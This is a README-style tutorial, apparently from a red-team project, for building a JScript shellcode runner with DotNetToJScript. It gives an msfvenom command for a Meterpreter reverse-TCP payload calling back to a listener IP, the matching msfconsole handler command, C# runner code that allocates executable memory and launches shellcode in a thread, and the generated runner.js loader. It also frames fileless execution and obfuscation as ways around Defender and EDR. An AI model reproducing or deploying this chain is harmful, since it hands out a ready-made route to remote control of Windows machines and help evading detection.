## **Jscript Shellcode Runner**
 embedding **C# shellcode runner** into Jscript using **DotNetToJscript**.

## Overview
This project demonstrates how to embed a C# shellcode runner inside JScript using DotNetToJScript.  
It’s for **red team research and educational purposes only**.  

### Why JScript
- **JScript (.js on Windows)** runs through **Windows Script Host** directly:
    - **Bypasses browser security settings**.
    - Can interact with **ActiveX technology** and WSH engine.
- Result: Full system interaction without browser limitations.
### **Why Combine JScript and C#?**

- **Problem**: JScript alone cannot directly call **Win32 APIs**.
- **Solution**: Embed a **compiled C# assembly** inside JScript.
    - This gives JScript access to the **.NET Framework**, similar to PowerShell.
    - Allows payloads to run **entirely from memory**, bypassing disk-based detection.

### Step 1: **Create shellcode**

- Generate **64-bit C# byte array shellcode** 

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.2.142 LPORT=4444 -f csharp
```
  
- Start listener
    
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.2.142; set LPORT 4444; run"
``` 
- Copy the full byte array (`buf`).

### Step 2: **Create a New Project**

1. Open **Visual Studio**.
2. Go to **File → New → Project**.
3. Select:
  - **Class Library (.NET Framework)** (not Console App).
  - Choose **.NET Framework 4.x** (DotNetToJScript works best with .NET 4).
4. Name it `ExampleAssembly`.
5. Click **Create**.

### Step 3: Modify ExampleAssembly (C#)

Add imports & execution logic in `TestClass`:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
  static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
    uint flAllocationType, uint flProtect);

  [DllImport("kernel32.dll")]
  static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  [DllImport("kernel32.dll")]
  static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  public TestClass()
  {
        byte[] buf = new byte[626] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...};
  
        int size = buf.Length;
  
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);		
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
  }
  
}

```
  
  ### Step 4: Compile as x64
  
  - Ensure **platform = x64**.
  - Copy compiled DLL to [DotNetToJscript release](https://github.com/tyranid/DotNetToJScript/releases/download/v1.0.4/release_v1.0.4.7z) folder.
  
  ### Step 5: Generate JScript Payload
  
  ```cmd
  .\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
  ```
  the output runner.js would be like this
  ```js
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
.
.
.
.
;
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}
  ```   
  
### Step 6: Execution

- Double-click `runner.js`.
- Spawns **Meterpreter reverse shell** after a short delay.
<img width="1411" height="275" alt="image" src="https://github.com/user-attachments/assets/368b3511-72bd-4002-9d3d-5c86751d0030" />

---

## Requirements
- Windows 10/11 (x64)
- Visual Studio 2019/2022 (with .NET Framework 4.x SDK)
- [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
- Metasploit Framework (for payload + listener)
- Execution Policy allowing `.js` execution (default in Windows)

## Notes
- Payload executes entirely in memory (fileless execution).
- Defender/EDR may block it — obfuscation or encryption of shellcode may be required.
- Since it uses ActiveX + WSH, execution is outside browser sandbox.

